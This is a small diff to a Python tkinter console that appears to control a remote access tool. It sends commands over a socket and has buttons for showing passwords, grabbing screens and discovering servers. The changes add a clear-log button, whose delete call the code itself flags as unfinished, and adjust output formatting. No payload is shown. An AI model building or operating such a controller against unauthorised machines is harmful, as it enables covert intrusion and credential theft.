@@ -7,7 +7,6 @@ import time
 import rot13
 import base64
 import os
-from PIL import Image, ImageTk
 import pickle
 import progressbar
 from tkinter import tix
@@ -81,11 +80,17 @@ def execute():
     raw_output = s.recv(65535).decode('utf8')
     if raw_output.startswith('b3V0cHV0Cg=='):
         t1.config(state=NORMAL)
-        output = '{} command:{}\n{}\n'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), command,
-                                              raw_output.split('b3V0cHV0Cg==')[1])
+        output = '{} command:{}\n{}'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), command,
+                                            raw_output.split('b3V0cHV0Cg==')[1])
         t1.insert(END, output)
         t1.config(state=DISABLED)
 
+
+def cls():
+    ''':TODO:FIX CLEAR'''
+    t1.config(state=NORMAL)
+    t1.delete(0, END)
+    t1.config(state=DISABLED)
 
 def get_screenshot():
     try:
@@ -197,6 +202,7 @@ b4 = Button(root1, text='Execute', command=execute)
 b5 = Button(root1, text='Show password', command=show_password)
 b6 = Button(root1, text='Get Screen', command=get_screenshot)
 b7 = Button(root1, text='Discover Server', command=desc_serv)
+b8 = Button(root1, text='Clear log ', command=cls)
 t1 = ScrolledText(root1, bg='black', fg='white', height=10, width=70, font=('', 11))
 listbox = Listbox(root1, bg='black', fg='white', height=7, width=50)
 listbox.insert(END, 'Discovered server will show in here')
@@ -215,6 +221,7 @@ e3.pack()
 b4.pack()
 l5.pack()
 t1.pack()
+b8.pack()
 b6.pack()
 l6.pack()
 b3.pack()
